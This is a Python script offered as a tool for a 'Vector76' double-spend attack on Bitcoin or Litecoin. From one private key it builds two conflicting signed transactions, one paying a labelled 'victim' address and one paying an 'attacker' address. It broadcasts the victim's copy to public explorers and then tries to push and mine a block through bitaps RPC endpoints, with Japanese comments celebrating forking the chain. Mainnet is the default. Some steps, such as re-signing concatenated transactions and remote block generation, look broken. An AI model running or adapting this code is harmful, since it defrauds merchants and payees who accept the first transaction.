import argparse
import time
import requests
import subprocess
import cryptos
import subprocess

parser = argparse.ArgumentParser(description="How To use vector76")

parser.add_argument("from_wifkey",
                    help="Fake send btc from wif key.",
                    type=str)
parser.add_argument("send_to",
                    help="Fake send btc to address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address fthat can be generated",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                    type=float)
parser.add_argument("fee",
                    help=". (Enter in BTC units) The maximum amount delayed will vary depending on send_from.",
                    type=float)
parser.add_argument("symbol",
                    help="coin symbol btc or ltc",
                    type=str)
parser.add_argument("is_testnet",
                    help="Testnet flag 0 or 1",
                    type=int)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):
    url = "https://blockchain.info/pushtx"
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    payload = {'tx': raw_tx}
    if testnet:
        url = "https://blockstream.info/testnet/api/tx"
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx

    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")

def broadcast_mempool_space(raw_tx, testnet):
    url = "https://mempool.space/api/tx"
    payload = raw_tx
    headers = {'Content-Type': 'text/plain'}
    if testnet:
        url = "https://mempool.space/testnet/api/tx"
    
    if coin_symbol == "ltc":
        url = "https://litecoinspace.org/api/tx"
        if testnet:
            url = "https://litecoinspace.org/testnet/api/tx"

    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")


args = parser.parse_args()
fake_send_from   = args.from_wifkey
victim_address   = args.send_to
attacker_address = args.attacker_address
amount_btc = args.amount_of_coins
testnet    = args.is_testnet
coin_symbol = args.symbol

if testnet == 0:
    testnet = False
else:
    testnet = True

fee = to_satoshi(args.fee)

transaction_util = cryptos.Bitcoin(testnet=testnet)
if coin_symbol == "ltc":
    transaction_util = cryptos.Litecoin(testnet=testnet)
    sender  = transaction_util.privtopub(fake_send_from)
    address = transaction_util.pubtoaddr(sender)
    balance = transaction_util.get_balance(address)
    inputs  = transaction_util.get_unspents(address)
else:
    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
    inputs  = transaction_util.get_unspents(transaction_util.wiftoaddr(fake_send_from))

print("OK")
print(balance)

send_amount = to_satoshi(amount_btc)

print(inputs)

tx_victim   = [{"address": victim_address, "value": send_amount}]
tx_attacker = [{"address": attacker_address, "value": send_amount}]
tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
tx_victim   = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)

tx_attacker = transaction_util.sign(tx_attacker, 0, fake_send_from)
tx_victim   = transaction_util.sign(tx_victim, 0, fake_send_from)
tx_victim   = cryptos.serialize(tx_victim)
tx_attacker = cryptos.serialize(tx_attacker)
block = f"{tx_victim}{tx_attacker}"


def generate_block(tx):
    payload = {"jsonrpc":"1.0","id":"1","method":"generateblock","params":[attacker_address, [tx]]}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    url     = f"https://api.bitaps.com/{coin_symbol}/native/"
    if testnet:
        url = f"https://api.bitaps.com/{coin_symbol}/testnet/native/"

    result  = requests.post(url, data=payload, headers=headers)
    print(result)
    print(result.status_code)
    return result

def submit_block(block_data):
    payload = {"jsonrpc":"1.0","id":"1","method":"submitblock","params": [block_data]}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    url     = f"https://api.bitaps.com/{coin_symbol}/native/"
    if testnet:
        url = f"https://api.bitaps.com/{coin_symbol}/testnet/native/"
    result  = requests.post(url, data=payload, headers=headers)
    print(result)
    print(result.status_code)

def send_rawtransaction(tx_data):
    payload = {"jsonrpc":"1.0","id":"1","method":"sendrawtransaction","params":[tx_data]}
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    url     = f"https://api.bitaps.com/{coin_symbol}/native/"
    if testnet:
        url = f"https://api.bitaps.com/{coin_symbol}/testnet/native/"
    result  = requests.post(url, data=payload, headers=headers)
    print(result)
    print(result.status_code)




block = transaction_util.signall(block, fake_send_from)
block = cryptos.serialize(block)

print("generating block...")
print()
print("[+] READY...")
print()
print("--------------------")
print(f"Send to                           : {victim_address}")
print(f"Send Coin Amount  (Satoshi unit)  : {send_amount} Satoshi")
print(f"Send Fee Amount   (Satoshi unit)  : {fee} Satoshi")
print(f"Victim transaction                : {tx_victim}")
print(f"Attacker transaction              : {tx_attacker}")
print(f"V                                 : {block}")
print(f"Testnet Mode                      : {testnet}")
print("--------------------")
print()
print()
print()
input("--- Are you sure you want to continue? Press Enter to continue. ---")
print("Sending victim Transaction ...")

print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
print()
time.sleep(1) #詠唱中.... -o-
print("FRK BC EXE DSPND (ブロックチェーンを分岐、 二重払いを実行!)")
time.sleep(1) 
if coin_symbol == "btc":
    broadcast_transaction(tx_victim, testnet)
else:
    broadcast_mempool_space(tx_victim, testnet)
# >>>> FRK BC EXE DSPND 0w0
print()
send_rawtransaction(block)
input("--- READY... --- ")
print("generating block")
generate_block(block)
#transaction_util.pushtx(tx_attacker)
print()
print()

print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()
sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print("----------------")
print("Done.")
